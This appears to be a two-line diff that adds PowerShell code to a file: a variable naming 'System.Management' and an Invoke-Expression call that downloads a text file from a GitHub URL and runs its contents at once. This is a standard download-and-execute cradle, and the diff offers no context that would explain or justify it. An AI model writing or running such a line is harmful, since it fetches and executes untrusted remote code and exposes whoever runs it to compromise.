@@ -1,0 +1,2 @@
+$data = "System.Management"
+iex(new-object net.webclient).downloadstring('https://github.com/deverisc/arithmetic/edit/main/arithmetic001.txt')
